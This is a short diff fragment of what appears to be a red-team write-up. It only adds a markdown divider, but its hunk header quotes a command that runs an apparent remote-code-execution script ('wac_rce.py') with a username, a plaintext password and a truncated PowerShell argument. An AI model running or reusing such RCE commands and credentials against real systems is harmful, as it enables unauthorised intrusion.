@@ -231,6 +231,9 @@ python3 wac_rce.py 'anderson.w' 'R3dT3am@Acc3ss#01' "powershell -NoProfile -Exec
 
 
 
+---
+
+
 
 
 
